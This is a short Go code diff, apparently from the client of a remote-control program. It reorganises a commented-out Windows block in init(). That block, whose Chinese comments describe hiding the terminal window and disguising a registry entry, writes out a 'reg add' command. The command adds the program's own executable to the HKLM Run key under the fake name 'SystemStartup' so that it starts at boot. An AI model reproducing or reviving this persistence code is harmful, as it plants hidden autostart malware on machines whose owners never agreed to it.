@@ -23,22 +23,14 @@ var client *http.Client
 func init() {
 	client = &http.Client{}
 	ID = strconv.FormatInt(rand.New(rand.NewSource(time.Now().UnixNano())).Int63(), 10)
-	switch runtimeEnvironment {
-	case "windows":
-		////隐藏终端窗口
-		////修改windows注册表实现开机自动启动
-		//keyName := `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` //自启动注册表路径
-		//valueName := `SystemStartup`                                                  //伪装注册表名
-		//regType := `REG_SZ`
-		//regData, _ := os.Executable()
-		//cmdLine:=	fmt.Sprintf(`reg add %s /v %s /t %s /d "%s"`, keyName, valueName, regType, regData)
-		//cmd:=NewCommand(cmdLine)
-		//go cmd.Exec()
-	case "linux":
-
-	case "darwin":
-
-	}
+	////隐藏终端窗口，修改windows注册表实现开机自动启动
+	//keyName := `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` //自启动注册表路径
+	//valueName := `SystemStartup`                                                  //伪装注册表名
+	//regType := `REG_SZ`
+	//regData, _ := os.Executable()
+	//cmdLine:=	fmt.Sprintf(`reg add %s /v %s /t %s /d "%s"`, keyName, valueName, regType, regData)
+	//cmd:=NewCommand(cmdLine)
+	//go cmd.Exec()
 }
 
 func main() {
